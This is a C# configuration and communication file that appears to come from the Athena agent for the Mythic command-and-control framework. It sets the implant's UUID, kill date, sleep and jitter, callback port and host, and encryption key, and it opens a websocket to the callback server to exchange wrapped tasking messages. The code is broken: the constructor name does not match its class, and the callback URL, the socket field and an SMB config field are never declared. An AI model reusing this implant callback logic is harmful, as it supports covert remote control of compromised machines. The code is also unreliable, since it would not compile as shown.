using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class MythicConfig
    {
        public SmbClient currentConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public SmbServer smbServer { get; set; }

        public MythicConfig()
        {
            //this.uuid = "%UUID%";
            //this.killDate = DateTime.Parse("killdate");
            //int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            //this.sleep = sleep;
            //int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            //this.jitter = jitter;
            //this.currentConfig = new Websocket(this.uuid);
            this.uuid = "526cef59-f8a9-4473-a7e0-04e45a6de1f5";
            this.killDate = DateTime.Parse("2022-08-25");
            int sleep = int.TryParse("0", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new SmbClient(this.uuid);
            this.smbConfig = new SMBConfig();
        }
    }

    public class SmbClient
    {
        public string psk { get; set; }
        public string callbackHost { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public PSKCrypto crypt { get; set; }

        public SMBClient(string uuid)
        {
            //int callbackPort = Int32.Parse("callback_port");
            //string callbackHost = "callback_host";
            //string callbackURL = $"{callbackHost}:{callbackPort}/{endpoint}";
            //this.endpoint = "ENDPOINT_REPLACE";
            //this.userAgent = "USER_AGENT";
            //this.hostHeader = "%HOSTHEADER%";
            //this.psk = "AESPSK";
            //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            int callbackPort = Int32.Parse("8081");
            string callbackHost = "smb_servers";
            this.psk = "";
            this.encryptedExchangeCheck = bool.Parse("False");
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                Globals.encrypted = true;
            }

            Connect(callbackURL);
        }

        public bool Connect(string url)
        {
            try
            {
                ws = new ClientWebSocket();
                ws.ConnectAsync(new Uri(url), CancellationToken.None);
                while (ws.State != WebSocketState.Open)
                {
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        public async Task<string> Send(object obj)
        {
            try
            {
                string json = JsonConvert.SerializeObject(obj);
                if (Globals.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }
                WebSocketMessage m = new WebSocketMessage()
                {
                    Client = true,
                    Data = json,
                    Tag = ""
                };
                string message = JsonConvert.SerializeObject(m);
                byte[] msg = Encoding.UTF8.GetBytes(message);
                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
                message = await Receive(ws);
                m = JsonConvert.DeserializeObject<WebSocketMessage>(message);

                if (Globals.encrypted)
                {
                    return this.crypt.Decrypt(m.Data);
                }
                else
                {
                    //Console.WriteLine(Misc.Base64Decode(m.Data).Substring(36));
                    return Misc.Base64Decode(m.Data).Substring(36);
                }
            }
            catch
            {
                return "";
            }
        }
        static async Task<string> Receive(ClientWebSocket socket)
        {
            var buffer = new ArraySegment<byte>(new byte[2048]);
            do
            {
                WebSocketReceiveResult result;
                using (var ms = new MemoryStream())
                {
                    do
                    {
                        result = await socket.ReceiveAsync(buffer, CancellationToken.None);
                        ms.Write(buffer.Array, buffer.Offset, result.Count);
                    } while (!result.EndOfMessage);

                    if (result.MessageType == WebSocketMessageType.Close)
                        break;

                    ms.Seek(0, SeekOrigin.Begin);
                    using (var reader = new StreamReader(ms, Encoding.UTF8))
                        return (await reader.ReadToEndAsync());
                }
            } while (true);
            return "";
        }
        private class WebSocketMessage
        {
            public bool Client { get; set; }
            public string Data { get; set; }
            public string Tag { get; set; }
        }
    }
}
